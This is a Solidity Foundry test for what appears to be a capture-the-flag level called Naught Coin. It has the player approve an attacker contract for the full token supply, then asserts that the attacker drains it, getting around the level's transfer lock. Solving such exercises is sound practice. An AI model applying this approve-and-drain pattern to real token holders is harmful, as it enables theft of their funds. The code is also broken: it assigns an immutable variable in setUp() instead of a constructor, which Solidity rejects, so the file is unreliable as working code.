// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {Attacker} from "./../src/15-Naught Coin/Attacker.sol";

interface INaughtCoin {
    function balanceOf(address player) external view returns (uint256);
    function player() external view returns (address);
    function decimals() external view returns (uint8);
    function approve(address sender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract TestNaughtCoin is Test {
    address public constant TARGET_ADDRESS = 0x252348C239c3435DFab1365C20DDF989dd8A8431;
    INaughtCoin target;
    Attacker attacker;
    uint256 public immutable INITIAL_SUPPLY;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        target = INaughtCoin(TARGET_ADDRESS);
        attacker = new Attacker();
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(target.decimals()));
    }

    function testNaughtCoin() public {
        address player = target.player();

        // check initial balance
        uint256 startingBalance = target.balanceOf(player);
        assert(startingBalance == INITIAL_SUPPLY);

        // give allowance
        vm.prank(player);
        target.approve(address(attacker), INITIAL_SUPPLY);

        // verify allowance
        assert(target.allowance(player, address(attacker)) == INITIAL_SUPPLY);

        // attack
        attacker.transferMe();
        
        // check final balance - should be zero to pass the level
        uint256 endingBalance = target.balanceOf(player);
        assert(endingBalance == 0);

        // additional check - check attacker balance (= starting balance)
        assert(target.balanceOf(address(attacker)) == INITIAL_SUPPLY);
    }

}